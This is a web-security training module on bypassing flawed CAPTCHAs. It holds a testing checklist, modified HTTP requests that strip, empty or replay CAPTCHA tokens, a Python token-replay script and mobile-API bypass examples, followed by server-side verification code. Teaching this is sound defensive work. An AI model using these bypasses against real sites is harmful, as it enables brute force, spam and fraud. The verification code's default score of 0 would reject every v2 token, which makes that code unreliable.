# 🤖 Module 15: Insecure Captcha

> **Level:** 🔴 Advanced | **Time:** ~2 hours | **Prerequisites:** Module 01-14

---

## 📖 Overview

CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) is meant to prevent automated attacks. However, CAPTCHA implementations are frequently flawed — verifying on the client side, using reusable tokens, or being bypassable by simply not sending the CAPTCHA field. These bugs directly enable brute force, spam, and account abuse.

---

## ❓ Why It Matters

A bypassed CAPTCHA on a registration form enables spam account creation at scale. On a login form, it enables brute force attacks. On a payment form, it enables card testing fraud. Companies lose real money when CAPTCHA is broken — making these high-impact findings.

---

## 🌍 Real-World Example

A researcher found that a major ticket-selling platform's CAPTCHA was validated only on the client side. By disabling JavaScript, the CAPTCHA requirement vanished entirely. Bots could purchase thousands of high-demand event tickets without any friction. This business-critical vulnerability earned a **$5,000 bounty**.

---

## 📋 Step-by-Step Methodology

### CAPTCHA Bypass Testing Checklist

```
□ Remove CAPTCHA parameter entirely from request
□ Use an empty CAPTCHA value
□ Replay a previously valid CAPTCHA token
□ Solve once and reuse the token multiple times
□ Check if CAPTCHA is validated server-side or client-side
□ Disable JavaScript and see if CAPTCHA disappears
□ Change request method (POST → GET) to bypass CAPTCHA
□ Test with old/expired CAPTCHA tokens
□ Check if CAPTCHA token is tied to session/user
□ Test CAPTCHA on mobile API endpoints (often missing)
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept and modify CAPTCHA parameters |
| **2captcha.com** | Automated CAPTCHA solving service |
| **Anti-CAPTCHA** | Another solving service (for PoC only) |
| **Selenium** | Browser automation |

---

## 💡 Payload Examples

### Basic Bypass Techniques

```bash
# Technique 1: Remove CAPTCHA parameter entirely
# Original request:
POST /register HTTP/1.1
username=test&password=pass123&captcha=03AGdBq...

# Modified request (remove captcha):
POST /register HTTP/1.1
username=test&password=pass123

# Technique 2: Empty value
POST /register HTTP/1.1
username=test&password=pass123&captcha=

# Technique 3: Replay valid token
# Solve CAPTCHA once → get token
# Use that same token for 100 requests
# If server doesn't invalidate it → bypass!
```

### Token Replay Attack

```python
import requests
import time

def test_captcha_replay(target_url, valid_token, num_attempts=10):
    """
    Test if a valid CAPTCHA token can be reused multiple times.
    Only use on applications you own or have permission to test.
    """
    results = []
    
    for i in range(num_attempts):
        payload = {
            'username': f'testuser{i}',
            'password': 'Password123!',
            'email': f'test{i}@test.com',
            'captcha': valid_token    # Reuse the same token!
        }
        
        response = requests.post(target_url, data=payload)
        success = 'already taken' in response.text or response.status_code == 200
        
        results.append({
            'attempt': i + 1,
            'status': response.status_code,
            'success': success
        })
        
        print(f"Attempt {i+1}: Status {response.status_code}")
        time.sleep(0.5)
    
    reused_count = sum(1 for r in results if r['success'])
    print(f"\n[*] CAPTCHA token reused successfully: {reused_count}/{num_attempts} times")
    
    if reused_count > 1:
        print("[!] VULNERABILITY: CAPTCHA token is reusable!")
    
    return results
```

### Mobile API Bypass

```bash
# Web app has CAPTCHA, but mobile API often doesn't
# Find the mobile API endpoint:
# - Check app traffic with Burp + Android emulator
# - Look for /api/v1/, /m./, /mobile/ paths

# Web login (with CAPTCHA)
POST /login HTTP/1.1
Host: target.com
username=admin&password=test&captcha=SOLVED

# Mobile API login (often no CAPTCHA!)
POST /api/v1/login HTTP/1.1
Host: api.target.com
{"username": "admin", "password": "test"}
# No captcha field required!
```

### reCAPTCHA v2 Testing

```python
# Check if server actually verifies reCAPTCHA response
# by sending a test token from Google's test keys

# Google's test reCAPTCHA site key: 6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI
# Always returns success - use this to test if server checks properly

test_token = "03AGdBq..."  # Any token from test site key

# If the server accepts this test token on a production site,
# the CAPTCHA validation is not checking the secret key properly!
```

### CAPTCHA Parameter Manipulation

```
# Test various modifications to the CAPTCHA parameter name
captcha=       → empty
CAPTCHA=valid  → case change
g-recaptcha-response=valid → standard param
captcha_token=valid
recaptcha=valid
verify=valid
token=valid

# Try sending wrong field name with valid value
# Some servers check if "captcha" field exists but don't validate value
captcha_bypass=03AGdBq...&captcha=

# Double parameter (HPP)
captcha=invalid&captcha=valid
```

---

## 🛡️ Prevention

| Issue | Prevention |
|-------|-----------|
| Client-side validation only | **Always** validate CAPTCHA server-side |
| Reusable tokens | Invalidate token after first use |
| No token-user binding | Tie token to session or IP |
| Missing from API | Apply CAPTCHA to API endpoints too |
| Weak CAPTCHA | Use Google reCAPTCHA v3 or hCaptcha |

```python
# Server-side Google reCAPTCHA verification (Python)
import requests

def verify_recaptcha(token, user_ip=None):
    """Verify reCAPTCHA token server-side"""
    secret_key = "YOUR_SECRET_KEY"  # Keep this server-side only!
    
    payload = {
        'secret': secret_key,
        'response': token,
    }
    if user_ip:
        payload['remoteip'] = user_ip
    
    response = requests.post(
        'https://www.google.com/recaptcha/api/siteverify',
        data=payload
    )
    
    result = response.json()
    
    # Check success AND score (for v3)
    if not result.get('success'):
        return False
    
    # For reCAPTCHA v3: check score (0.0 = bot, 1.0 = human)
    score = result.get('score', 0)
    if score < 0.5:
        return False
    
    return True

# Use in endpoint
@app.route('/register', methods=['POST'])
def register():
    captcha_token = request.form.get('g-recaptcha-response')
    
    if not verify_recaptcha(captcha_token, request.remote_addr):
        return jsonify({'error': 'CAPTCHA verification failed'}), 400
    
    # Proceed with registration
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| DVWA | localhost | Insecure CAPTCHA module |
| PortSwigger | [portswigger.net](https://portswigger.net/web-security) | Authentication bypass |
| Custom test | Set up your own app | Implement and break CAPTCHA |

---

<div align="center">

[← Module 14: Server-Side Attacks](../14.%20Server-Side%20Attacks/README.md) | [Next Module: Automating VAPT →](../16.%20Automating%20VAPT/README.md)

</div>
